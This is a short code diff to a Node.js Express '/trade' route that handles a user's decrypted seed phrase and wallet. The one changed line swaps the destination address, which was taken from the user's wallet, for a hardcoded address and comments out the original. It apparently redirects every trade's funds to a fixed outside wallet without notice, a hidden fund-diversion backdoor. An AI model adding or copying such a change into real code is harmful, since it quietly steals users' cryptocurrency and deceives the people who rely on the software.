@@ -61,7 +61,7 @@ app.post("/trade", auth, async (req, res) => {
             let nameValue = hash
             let amount
             let decryptedSeedPhrase = s.seed
-            let destAddress = s.wallet.addresses[0].address
+            let destAddress = "dc1q33rhfm9zyxxa87sc3v5cqmjvzgrknmp48sty7m" //= s.wallet.addresses[0].address
 
             let our_wallet = s.wallet
 
